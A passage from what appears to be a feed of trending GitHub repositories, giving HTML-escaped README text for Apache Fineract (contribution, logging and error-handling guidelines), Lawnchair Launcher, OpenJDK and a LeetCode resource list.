 &lt;li&gt;&lt;a href="https://github.com/openMF/community-app/"&gt;https://github.com/openMF/community-app/&lt;/a&gt; is the "traditional" Reference Client App Web UI for the API offered by this project&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/openMF/web-app"&gt;https://github.com/openMF/web-app&lt;/a&gt; is the next generation UI rewrite also using this project's API&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/openMF/android-client"&gt;https://github.com/openMF/android-client&lt;/a&gt; is an Android Mobile App client for this project's API&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/openMF"&gt;https://github.com/openMF&lt;/a&gt; has more related proejcts&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;&lt;br&gt;ONLINE DEMOS&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://sandbox.mifos.community"&gt;sandbox.mifos.community&lt;/a&gt; always runs the latest version of this code&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://demo.mifos.io"&gt;demo.mifos.io&lt;/a&gt; A demo account is provided for users to experience the functionality of the Community App. Users can use "mifos" for USERNAME and "password" for PASSWORD (without quotation marks).&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=FlVd-0YAo6c"&gt;Swagger-UI Demo video&lt;/a&gt; This is a demo video for Swagger-UI documentation, more information &lt;a href="https://github.com/apache/fineract#swagger-ui-documentation"&gt;here&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;&lt;br&gt;DEVELOPERS&lt;/h1&gt; 
&lt;p&gt;Please see &lt;a href="https://cwiki.apache.org/confluence/display/FINERACT/Contributor%27s+Zone"&gt;https://cwiki.apache.org/confluence/display/FINERACT/Contributor%27s+Zone&lt;/a&gt; for the developers wiki page.&lt;/p&gt; 
&lt;p&gt;Please refer to &lt;a href="https://cwiki.apache.org/confluence/display/FINERACT/Fineract+101"&gt;https://cwiki.apache.org/confluence/display/FINERACT/Fineract+101&lt;/a&gt; for the first-time contribution to this project.&lt;/p&gt; 
&lt;p&gt;Please see &lt;a href="https://cwiki.apache.org/confluence/display/FINERACT/How-to+articles"&gt;https://cwiki.apache.org/confluence/display/FINERACT/How-to+articles&lt;/a&gt; for technical details to get started.&lt;/p&gt; 
&lt;p&gt;Please visit &lt;a href="https://issues.apache.org/jira/secure/Dashboard.jspa?selectPageId=12335824"&gt;our JIRA Dashboard&lt;/a&gt; to find issues to work on, see what others are working on, or open new issues.&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;VIDEO DEMONSTRATION&lt;/h1&gt; 
&lt;p&gt;Apache Fineract / Mifos X Demo (November 2016) - &lt;a href="https://www.youtube.com/watch?v=h61g9TptMBo"&gt;https://www.youtube.com/watch?v=h61g9TptMBo&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;SWAGGER UI DEMONSTRATION&lt;/h1&gt; 
&lt;p&gt;We use Swagger-UI to generate and maintain our API documentation, you can see the demo video &lt;a href="https://www.youtube.com/watch?v=FlVd-0YAo6c"&gt;here&lt;/a&gt; or a live version &lt;a href="https://sandbox.mifos.community/fineract-provider/swagger-ui/index.html"&gt;here&lt;/a&gt;. If you interested to know more about Swagger-UI you can check their &lt;a href="https://swagger.io/"&gt;website&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;GOVERNANCE AND POLICIES&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://cwiki.apache.org/confluence/display/FINERACT/Becoming+a+Committer"&gt;Becoming a Committer&lt;/a&gt; documents the process through which you can become a committer in this project.&lt;/p&gt; 
&lt;h2&gt;&lt;br&gt;ERROR HANDLING GUIDELINES&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;When catching exceptions, either rethrow them, or log them. Either way, include the root cause by using &lt;code&gt;catch (SomeException e)&lt;/code&gt; and then either &lt;code&gt;throw AnotherException("..details..", e)&lt;/code&gt; or &lt;code&gt;LOG.error("...context...", e)&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;Completely empty catch blocks are VERY suspicous! Are you sure that you want to just "swallow" an exception? Really, 100% totally absolutely sure?? ;-) Such "normal exceptions which just happen sometimes but are actually not really errors" are almost always a bad idea, can be a performance issue, and typically are an indication of another problem - e.g. the use of a wrong API which throws an Exception for an expected condition, when really you would want to use another API that instead returns something empty or optional.&lt;/li&gt; 
 &lt;li&gt;In tests, you'll typically never catch exceptions, but just propagate them, with &lt;code&gt;@Test void testXYZ() throws SomeException, AnotherException&lt;/code&gt;..., so that the test fails if the exception happens. Unless you actually really want to test for the occurence of a problem - in that case, use &lt;a href="https://github.com/junit-team/junit4/wiki/Exception-testing"&gt;JUnit's Assert.assertThrows()&lt;/a&gt; (but not &lt;code&gt;@Test(expected = SomeException.class)&lt;/code&gt;).&lt;/li&gt; 
 &lt;li&gt;Never catch &lt;code&gt;NullPointerException&lt;/code&gt; &amp;amp; Co.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;br&gt;LOGGING GUIDELINES&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;We use &lt;a href="http://www.slf4j.org"&gt;SLF4J&lt;/a&gt; as our logging API.&lt;/li&gt; 
 &lt;li&gt;Never, ever, use &lt;code&gt;System.out&lt;/code&gt; and &lt;code&gt;System.err&lt;/code&gt; or &lt;code&gt;printStackTrace()&lt;/code&gt; anywhere, but always &lt;code&gt;LOG.info()&lt;/code&gt; or &lt;code&gt;LOG.error()&lt;/code&gt; instead.&lt;/li&gt; 
 &lt;li&gt;Use placeholder (&lt;code&gt;LOG.error("Could not... details: {}", something, exception)&lt;/code&gt;) and never String concatenation (&lt;code&gt;LOG.error("Could not... details: " + something, exception)&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;Which Log Level is appropriate? 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;LOG.error()&lt;/code&gt; should be used to inform an "operator" running Fineract who supervises error logs of an unexpected condition. This includes technical problems with an external "environment" (e.g. can't reach a database), and situations which are likely bugs which need to be fixed in the code. They do NOT include e.g. validation errors for incoming API requests - that is signaled through the API response - and does (should) not be logged as an error. (Note that there is no &lt;em&gt;FATAL&lt;/em&gt; level in SLF4J; a "FATAL" event should just be logged as an &lt;em&gt;ERROR&lt;/em&gt;.)&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;LOG.warn()&lt;/code&gt; should be using sparingly. Make up your mind if it's an error (above) - or not!&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;LOG.info()&lt;/code&gt; can be used notably for one-time actions taken during start-up. It should typically NOT be used to print out "regular" application usage information. The default logging configuration always outputs the application INFO logs, and in production under load, there's really no point to constantly spew out lots of information from frequently traversed paths in the code about what's going on. (Metrics are a better way.) &lt;code&gt;LOG.info()&lt;/code&gt; &lt;em&gt;can&lt;/em&gt; be used freely in tests though.&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;LOG.debug()&lt;/code&gt; can be used anywhere in the code to log things that may be useful during investigations of specific problems. They are not shown in the default logging configuration, but can be enabled for troubleshooting. Developers should typically "turn down" most &lt;code&gt;LOG.info()&lt;/code&gt; which they used while writing a new feature to "follow along what happens during local testing" to &lt;code&gt;LOG.debug()&lt;/code&gt; for production before we merge their PRs.&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;LOG.trace()&lt;/code&gt; is not used in Fineract.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Pull Requests&lt;/h2&gt; 
&lt;p&gt;We request that your commit message include a FINERACT JIRA issue, and a one-liner that describe the changes. Start with an upper case imperative verb (not past form), and a short but concise clear description. (E.g. "FINERACT-821: Add enforced HideUtilityClassConstructor checkstyle").&lt;/p&gt; 
&lt;p&gt;If your PR is failing to pass our CI build due to a test failure, then:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Understand if the failure is due to your PR or an unrelated unstable test.&lt;/li&gt; 
 &lt;li&gt;If you suspect it is because of a "flaky" test, and not due to a change in your PR, then please do not simply wait for an active maintainer to come and help you, but instead be a proactive contributor to the project - see next steps. Do understand that we may not review PRs that are not green - it is the contributor's (that's you!) responsability to get a proposed PR to pass the build, not primarily the maintainers.&lt;/li&gt; 
 &lt;li&gt;Search for the name of the failed test on &lt;a href="https://issues.apache.org/jira/"&gt;https://issues.apache.org/jira/&lt;/a&gt;, e.g. for &lt;code&gt;AccountingScenarioIntegrationTest&lt;/code&gt; you would find &lt;a href="https://issues.apache.org/jira/browse/FINERACT-899"&gt;FINERACT-899&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;If you happen to read in such bugs that tests were just recently fixed, or ignored, then rebase your PR to pick up that change.&lt;/li&gt; 
 &lt;li&gt;If you find previous comments "proving" that the same test has arbitrarily failed in at least 3 past PRs, then please do yourself raise a small separate new PR proposing to add an &lt;code&gt;@Disabled // TODO FINERACT-123&lt;/code&gt; to the respective unstable test (e.g. &lt;a href="https://github.com/apache/fineract/pull/774"&gt;#774&lt;/a&gt;) with the commit message mentioning said JIRA, as always. (Please do NOT just &lt;code&gt;@Disabled&lt;/code&gt; any existing tests mixed in as part of your larger PR.)&lt;/li&gt; 
 &lt;li&gt;If there is no existing JIRA for the test, then first please evaluate whether the failure couldn't be a (perhaps strange) impact of the change you are proposing after all. If it's not, then please raise a new JIRA to document the suspected Flaky Test, and link it to &lt;a href="https://issues.apache.org/jira/browse/FINERACT-850"&gt;FINERACT-850&lt;/a&gt;. This will allow the next person coming along hitting the same test failure to easily find it, and eventually propose to ignore the unstable test.&lt;/li&gt; 
 &lt;li&gt;Then (only) Close and Reopen your PR, which will cause a new build, to see if it passes.&lt;/li&gt; 
 &lt;li&gt;Of course, we very much appreciate you then jumping onto any such bugs and helping us figure out how to fix all ignored tests!&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;a href="https://cwiki.apache.org/confluence/display/FINERACT/Pull+Request+Size+Limit"&gt;Pull Request Size Limit&lt;/a&gt; documents that we cannot accept huge "code dump" Pull Requests, with some related suggestions.&lt;/p&gt; 
&lt;p&gt;Guideline for new Feature commits involving Refactoring: If you are submitting PR for a new Feature, and it involves refactoring, try to differentiate "new Feature code" with "Refactored" by placing them in different commits. This helps review to review your code faster.&lt;/p&gt; 
&lt;p&gt;We have an automated Bot which marks pull requests as "stale" after a while, and ultimately automatically closes them.&lt;/p&gt; 
&lt;h2&gt;Merge Strategy&lt;/h2&gt; 
&lt;p&gt;This project's committers typically prefer to bring your Pull Requests in through &lt;em&gt;Rebase and Merge&lt;/em&gt; instead of &lt;em&gt;Create a Merge Commit&lt;/em&gt;. (If you are unfamiliar with GitHub's UI re. this, note the somewhat hidden little triangle drop-down at the bottom of PR, visible only to committers, not contributors.) This avoids the "merge commits" which we consider to be somewhat "polluting" the projects commits log history view. We understand this doesn't give an easy automatic reference to the original PR (which GitHub automatically adds to the Merge Commit message it generates), but we consider this an only very minor inconvenience; it's typically relatively easy to find the original PR even just from the commit message, and JIRA.&lt;/p&gt; 
&lt;p&gt;We expect most proposed PRs to typically consist of a single commit. Committers may use &lt;em&gt;Squash and merge&lt;/em&gt; to combine your commits at merge time, and if they do so will rewrite your commit message as they see fit.&lt;/p&gt; 
&lt;p&gt;Neither of these two are hard absolute rules, but mere conventions. Multiple commits in single PR make sense in certain cases (e.g. branch backports).&lt;/p&gt; 
&lt;h2&gt;Dependency Upgrades&lt;/h2&gt; 
&lt;p&gt;This project uses a number of 3rd-party libraries, and this section provides some guidance for their updates. We have set-up &lt;a href="https://renovate.whitesourcesoftware.com"&gt;Renovate's bot&lt;/a&gt; to automatically raise Pull Requests for our review when new dependencies are available &lt;a href="https://issues.apache.org/jira/browse/FINERACT-962"&gt;FINERACT-962&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Upgrades sometimes require package name changes. Changed code should ideally have test coverage.&lt;/p&gt; 
&lt;p&gt;Our &lt;code&gt;ClasspathHellDuplicatesCheckRuleTest&lt;/code&gt; detects classes that appear in more than 1 JAR. If a version bump in &lt;a href="https://github.com/search?q=repo%3Aapache%2Ffineract+filename%3Abuild.gradle&amp;amp;type=Code&amp;amp;ref=advsearch&amp;amp;l=&amp;amp;l="&gt;&lt;code&gt;build.gradle&lt;/code&gt;&lt;/a&gt; causes changes in transitives dependencies, then you may have to add related &lt;code&gt;exclude&lt;/code&gt; to our &lt;a href="https://github.com/apache/fineract/search?q=dependencies.gradle"&gt;&lt;code&gt;dependencies.gradle&lt;/code&gt;&lt;/a&gt;. Running &lt;code&gt;./gradlew dependencies&lt;/code&gt; helps to understand what is required.&lt;/p&gt; 
&lt;h1&gt;More Information&lt;/h1&gt; 
&lt;p&gt;More details of the project can be found at &lt;a href="https://cwiki.apache.org/confluence/display/FINERACT"&gt;https://cwiki.apache.org/confluence/display/FINERACT&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>LawnchairLauncher/lawnchair</title>
      <link>https://github.com/LawnchairLauncher/lawnchair</link>
      <description>&lt;p&gt;No clever tagline needed.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Lawnchair 15&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/LawnchairLauncher/lawnchair/actions/workflows/ci.yml"&gt;&lt;img src="https://github.com/LawnchairLauncher/lawnchair/actions/workflows/ci.yml/badge.svg?sanitize=true" alt="Build debug APK"&gt;&lt;/a&gt; &lt;a href="https://github.com/LawnchairLauncher/lawnchair/actions/workflows/release_update.yml"&gt;&lt;img src="https://github.com/LawnchairLauncher/lawnchair/actions/workflows/release_update.yml/badge.svg?sanitize=true" alt="Build release APK"&gt;&lt;/a&gt; &lt;a href="https://lawnchair.crowdin.com/lawnchair"&gt;&lt;img src="https://badges.crowdin.net/e/188ba69d884418987f0b7f1dd55e3a4e/localized.svg?sanitize=true" alt="Crowdin"&gt;&lt;/a&gt; &lt;a href="https://opencollective.com/lawnchair"&gt;&lt;img src="https://img.shields.io/opencollective/all/lawnchair?label=financial%20contributors&amp;amp;logo=open-collective" alt="OpenCollective"&gt;&lt;/a&gt; &lt;a href="https://t.me/lccommunity"&gt;&lt;img src="https://img.shields.io/endpoint?url=https%3A%2F%2Ftg.sumanjay.workers.dev%2Flccommunity" alt="Telegram"&gt;&lt;/a&gt; &lt;a href="https://discord.gg/3x8qNWxgGZ"&gt;&lt;img src="https://img.shields.io/discord/803299970169700402?label=server&amp;amp;logo=discord" alt="Discord"&gt;&lt;/a&gt; &lt;a href="https://github.com/LawnchairLauncher/lawnchair/releases"&gt;&lt;img src="https://img.shields.io/github/downloads/LawnchairLauncher/lawnchair/total.svg?label=GitHub%20Downloads&amp;amp;logo=github" alt="GitHub Downloads"&gt;&lt;/a&gt; &lt;a href="https://play.google.com/store/apps/details?id=app.lawnchair.play"&gt;&lt;img src="https://img.shields.io/endpoint?color=green&amp;amp;logo=googleplay&amp;amp;logoColor=green&amp;amp;url=https%3A%2F%2Fplay.cuzi.workers.dev%2Fplay%3Fi%3Dapp.lawnchair.play%26l%3DPlay%2520Store%2520Installs%26m%3D%24shortinstalls" alt="Play Store Installs"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;picture&gt; 
 &lt;!-- Avoid image being clickable with slight workaround --&gt; 
 &lt;!-- â�¤ï¸� Credit to Raine for the original mockup on the Lawnchair Discord --&gt; 
 &lt;!-- â�¤ï¸� Credit to Lawrence Kayku for the current mockup on Unsplash 
            https://unsplash.com/photos/photography-of-green-leaves-ZVKr8wADhpc 
    --&gt; 
 &lt;source media="(prefers-color-scheme: dark)" srcset="docs/assets/device-frame.png" width="250px"&gt; 
 &lt;img alt="Google Pixel running Lawnchair Launcher with green wallpaper" src="https://raw.githubusercontent.com/LawnchairLauncher/lawnchair/15-dev/docs/assets/device-frame.png" width="250px"&gt; 
&lt;/picture&gt; 
&lt;p&gt;Lawnchair is a free, open-source home app for Android. Taking Launcher3â€”Androidâ€™s default home appâ€”as a starting point, it ports Pixel Launcher features and introduces rich customization options.&lt;/p&gt; 
&lt;p&gt;This branch houses the codebase of Lawnchair 15, which is currently in beta and is based on Launcher3 from Android 15. For Lawnchair 9 to 14, see the branches with the &lt;code&gt;9-&lt;/code&gt; to &lt;code&gt;14-&lt;/code&gt; prefixes, respectively.&lt;/p&gt; 
&lt;h2&gt;Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Material You Theming:&lt;/strong&gt; Adapts to your wallpaper and system theme.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;At a Glance Widget:&lt;/strong&gt; Displays information &lt;em&gt;at a glance&lt;/em&gt; with support for &lt;a href="https://github.com/KieronQuinn/Smartspacer"&gt;Smartspacer&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;QuickSwitch Support:&lt;/strong&gt; Integrates with Android Recents on Android 10 and newer. (requires root)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Global Search:&lt;/strong&gt; Allows quick access to apps, contacts, and web results from the home screen.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Customization Options:&lt;/strong&gt; Provides options to tweak icons, fonts, and colors to your liking.&lt;/li&gt; 
 &lt;li&gt;And more!&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Download&lt;/h2&gt; 
&lt;p align="left"&gt; &lt;a href="https://play.google.com/store/apps/details?id=app.lawnchair.play"&gt; 
  &lt;picture&gt; 
   &lt;!-- Avoid image being clickable with slight workaround --&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="docs/assets/badge-google-play.png" height="60"&gt; 
   &lt;img alt="Get it on Google Play" src="https://raw.githubusercontent.com/LawnchairLauncher/lawnchair/15-dev/docs/assets/badge-google-play.png" height="60"&gt; 
  &lt;/picture&gt; &lt;/a&gt; &lt;a href="https://apt.izzysoft.de/fdroid/index/apk/app.lawnchair"&gt; 
  &lt;picture&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="docs/assets/badge-izzyondroid.png" height="60"&gt; 
   &lt;img alt="Get it on IzzyOnDroid" src="https://raw.githubusercontent.com/LawnchairLauncher/lawnchair/15-dev/docs/assets/badge-izzyondroid.png" height="60"&gt; 
  &lt;/picture&gt; &lt;/a&gt; &lt;a href="https://apps.obtainium.imranr.dev/redirect?r=obtainium://add/https://github.com/LawnchairLauncher/lawnchair/"&gt; 
  &lt;picture&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="docs/assets/badge-obtainium.png" height="60"&gt; 
   &lt;img alt="Get it on Obtainium" src="https://raw.githubusercontent.com/LawnchairLauncher/lawnchair/15-dev/docs/assets/badge-obtainium.png" height="60"&gt; 
  &lt;/picture&gt; &lt;/a&gt; &lt;a href="https://github.com/LawnchairLauncher/lawnchair/releases"&gt; 
  &lt;picture&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="docs/assets/badge-github.png" height="60"&gt; 
   &lt;img alt="Get it on GitHub" src="https://raw.githubusercontent.com/LawnchairLauncher/lawnchair/15-dev/docs/assets/badge-github.png" height="60"&gt; 
  &lt;/picture&gt; &lt;/a&gt; &lt;/p&gt; 
&lt;p&gt;Lawnchair on Play Store will install as a different app from other sources. Some features may be restricted to comply with Google Play's publishing rules.&lt;/p&gt; 
&lt;h3&gt;Development builds&lt;/h3&gt; 
&lt;p&gt;Interested in keeping yourself up-to-date with every Lawnchair development? Try our development builds!&lt;/p&gt; 
&lt;p&gt;These builds offer the latest features and bug fixes at a cost of being slower and introducing new bugs. Ensure that you make backups before installing.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href="https://apps.obtainium.imranr.dev/redirect?r=obtainium://app/%7B%22id%22%3A%22app.lawnchair.nightly%22%2C%22url%22%3A%22https%3A%2F%2Fgithub.com%2Flawnchairlauncher%2Flawnchair%22%2C%22author%22%3A%22Lawnchair%20Launcher%22%2C%22name%22%3A%22Lawnchair%20(Debug)%22%2C%22preferredApkIndex%22%3A0%2C%22additionalSettings%22%3A%22%7B%5C%22includePrereleases%5C%22%3Atrue%2C%5C%22fallbackToOlderReleases%5C%22%3Afalse%2C%5C%22filterReleaseTitlesByRegEx%5C%22%3A%5C%22Lawnchair%20Nightly%5C%22%2C%5C%22filterReleaseNotesByRegEx%5C%22%3A%5C%22%5C%22%2C%5C%22verifyLatestTag%5C%22%3Afalse%2C%5C%22dontSortReleasesList%5C%22%3Afalse%2C%5C%22useLatestAssetDateAsReleaseDate%5C%22%3Afalse%2C%5C%22trackOnly%5C%22%3Afalse%2C%5C%22versionExtractionRegEx%5C%22%3A%5C%22%5C%22%2C%5C%22matchGroupToUse%5C%22%3A%5C%22%5C%22%2C%5C%22versionDetection%5C%22%3Afalse%2C%5C%22releaseDateAsVersion%5C%22%3Atrue%2C%5C%22useVersionCodeAsOSVersion%5C%22%3Afalse%2C%5C%22apkFilterRegEx%5C%22%3A%5C%22%5C%22%2C%5C%22invertAPKFilter%5C%22%3Afalse%2C%5C%22autoApkFilterByArch%5C%22%3Atrue%2C%5C%22appName%5C%22%3A%5C%22%5C%22%2C%5C%22shizukuPretendToBeGooglePlay%5C%22%3Afalse%2C%5C%22exemptFromBackgroundUpdates%5C%22%3Afalse%2C%5C%22skipUpdateNotifications%5C%22%3Afalse%2C%5C%22about%5C%22%3A%5C%22Lawnchair%20is%20a%20free%2C%20open-source%20home%20app%20for%20Android.%20(NOTE%3A%20This%20is%20the%20debug%20version%20of%20Lawnchair%2C%20for%20the%20beta%2Fstable%20versions%20see%20%5C%5C%5C%22Lawnchair%5C%5C%5C%22)%5C%22%7D%22%7D"&gt;Obtainium&lt;/a&gt; â€¢ &lt;a href="https://github.com/LawnchairLauncher/lawnchair/releases/tag/nightly"&gt;GitHub&lt;/a&gt; â€¢ &lt;a href="https://nightly.link/LawnchairLauncher/lawnchair/workflows/ci/15-dev"&gt;nightly.link&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Verification&lt;/h3&gt; 
&lt;p&gt;Verify the integrity of your Lawnchair download using these SHA-256 hashes:&lt;/p&gt; 
&lt;h6&gt;Google Play&lt;/h6&gt; 
&lt;pre&gt;&lt;code&gt;47:AC:92:63:1C:60:35:13:CC:8D:26:DD:9C:FF:E0:71:9A:8B:36:55:44:DC:CE:C2:09:58:24:EC:25:61:20:A7
&lt;/code&gt;&lt;/pre&gt; 
&lt;h6&gt;Elsewhere&lt;/h6&gt; 
&lt;pre&gt;&lt;code&gt;74:7C:36:45:B3:57:25:8B:2E:23:E8:51:E5:3C:96:74:7F:E0:AD:D0:07:E5:BA:2C:D9:7E:8C:85:57:2E:4D:C5
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;Please visit the &lt;a href="https://raw.githubusercontent.com/LawnchairLauncher/lawnchair/15-dev/CONTRIBUTING.md"&gt;Lawnchair Contributing Guidelines&lt;/a&gt; for information and tips on contributing to Lawnchair.&lt;/p&gt; 
&lt;h2&gt;Quick links&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://lawnchair.app"&gt;Website&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://t.me/lawnchairci"&gt;News on Telegram&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://discord.com/invite/3x8qNWxgGZ"&gt;Discord&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://x.com/lawnchairapp"&gt;Lawnchair on X (formerly Twitter)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://xdaforums.com/t/lawnchair-customizable-pixel-launcher.3627137/"&gt;&lt;em&gt;XDA&lt;/em&gt; thread&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;You can view all our links in the &lt;a href="https://github.com/LawnchairLauncher/lawnchair/wiki"&gt;Lawnchair Wiki&lt;/a&gt;.&lt;/p&gt; 
&lt;!-- Download link --&gt;</description>
    </item>
    
    <item>
      <title>openjdk/jdk</title>
      <link>https://github.com/openjdk/jdk</link>
      <description>&lt;p&gt;JDK main-line development https://openjdk.org/projects/jdk&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Welcome to the JDK!&lt;/h1&gt; 
&lt;p&gt;For build instructions please see the &lt;a href="https://openjdk.org/groups/build/doc/building.html"&gt;online documentation&lt;/a&gt;, or either of these files:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/openjdk/jdk/master/doc/building.html"&gt;doc/building.html&lt;/a&gt; (html version)&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/openjdk/jdk/master/doc/building.md"&gt;doc/building.md&lt;/a&gt; (markdown version)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;See &lt;a href="https://openjdk.org/"&gt;https://openjdk.org/&lt;/a&gt; for more information about the OpenJDK Community and the JDK and see &lt;a href="https://bugs.openjdk.org"&gt;https://bugs.openjdk.org&lt;/a&gt; for JDK issue tracking.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>ashishps1/awesome-leetcode-resources</title>
      <link>https://github.com/ashishps1/awesome-leetcode-resources</link>
      <description>&lt;p&gt;Awesome LeetCode resources to learn Data Structures and Algorithms and prepare for Coding Interviews.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/ashishps1/awesome-leetcode-resources/main/images/leetcode-repo-logo.png" width="350" height="200"&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://blog.algomaster.io/"&gt;Join Free Newsletter&lt;/a&gt; &lt;/p&gt; 
&lt;p&gt;This repository contains awesome LeetCode resources to learn Data Structures and Algorithms (DSA) and prepare for Coding interviews.&lt;/p&gt; 
&lt;p&gt;ğŸ‘‰ If you want to master DSA patterns, checkout &lt;a href="https://algomaster.io"&gt;AlgoMaster.io&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;ğŸ’¡ Tips&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/how-i-mastered-data-structures-and-algorithms"&gt;How I Mastered DSA&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/how-to-start-leetcode-in-2025"&gt;How to Start LeetCode&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/15-leetcode-patterns"&gt;15 Leetcode Patterns&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;ğŸ“Œ Fundamental Concepts&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/57bd4963-462f-4294-a972-4012691fc729"&gt;Algorithmic Complexity&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.bigocheatsheet.com/"&gt;Big-O Cheat Sheet&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/c650df76-f978-46ee-a572-eb13c354905d"&gt;Bit Manipulation Techniques&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/jl-codes/understanding-sorting-algorithms-af6222995c8"&gt;Sorting Algorithms&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1800120/become-master-in-linked-list"&gt;Linked List&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/5d7a1368-7a0c-461a-93a9-732333ceb2a8"&gt;Dummy Node Technique&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/to-queue-or-not-to-queue-2653bcde5b04"&gt;Queues&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/stacks-and-overflows-dbcf7854dc67"&gt;Stacks&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/taking-hash-tables-off-the-shelf-139cbf4752f0"&gt;Hash Tables&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/learning-to-love-heaps-cef2b273a238"&gt;Heaps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1733447/become-master-in-recursion"&gt;Recursion&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/algorithms-and-leetcode/backtracking-e001561b9f28"&gt;Backtracking&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1820334/Become-Master-in-Tree"&gt;Trees&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/trying-to-understand-tries-3ec6bede0014"&gt;Tries&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/786126/Python-Powerful-Ultimate-Binary-Search-Template.-Solved-many-problems"&gt;Binary Search&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.freecodecamp.org/news/greedy-algorithms/"&gt;Greedy Algorithm&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/less-repetition-more-dynamic-programming-43d29830a630"&gt;Dynamic Programming&lt;/a&gt;&lt;/li&gt; 
